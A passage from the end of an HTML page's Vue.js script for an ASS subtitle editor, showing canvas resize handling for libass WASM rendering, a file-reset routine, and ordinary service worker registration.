                                    for (const entry of entries) {
                                        this.dummyVideo.containerWidth = entry.contentRect.width;
                                        this.dummyVideo.containerHeight = entry.contentRect.height;
                                        this.resizeLibassCanvas();
                                        this.resizeLibassPartsCanvas();
                                        this.renderLibassWasm();
                                        this.renderLibassWasmParts();
                                    }
                                });
                                this.resizeObserver.observe(this.$refs.videoContainer);
                            }
                        });
                    },
                    cleanupResizeObserver() {
                        if (this.resizeObserver) {
                            this.resizeObserver.disconnect();
                            this.resizeObserver = null;
                        }
                    },
                    resetFile() {
                        this.disposeLibassWasm();
                        this.disposeLibassWasmParts();
                        this.libassPartsFailed = false;
                        this.showResetConfirmModal = false;
                        this.assFile = null;
                        this.originalFileSnapshot = null;
                        this.lines = [];
                        this.editedLineIndices = [];
                        this.fileName = '';
                        this.fileSize = '0 Bytes';
                        this.isProcessing = false;
                        this.currentIndex = 0;
                        this.rtlPreviewText = '';
                        this.rtlEditHistory = Object.create(null);
                        this.errorLog = [];
                        this.scriptInfo = [];
                        this.styles = [];
                        this.dummyVideo.containerWidth = 0;
                        this.dummyVideo.containerHeight = 0;
                        this.overrideStats = {
                            fn: new Set(),
                            fs: new Set(),
                            colors: new Set(),
                            other: new Set()
                        };
                        if (this.$refs.fileInput) {
                            this.$refs.fileInput.value = '';
                        }
                    }
                }
            });

            app.mount('#app');

            if ('serviceWorker' in navigator) {
                window.addEventListener('load', () => {
                    const serviceWorkerUrl = new URL('service-worker.js', new URL('.', window.location.href));
                    navigator.serviceWorker.register(serviceWorkerUrl.toString())
                        .then((registration) => {
                            console.log('Service Worker registered: ', registration);
                        })
                        .catch((registrationError) => {
                            console.log('Service Worker registration failed: ', registrationError);
                        });
                });
            }
        </script>
    </body>
</html>
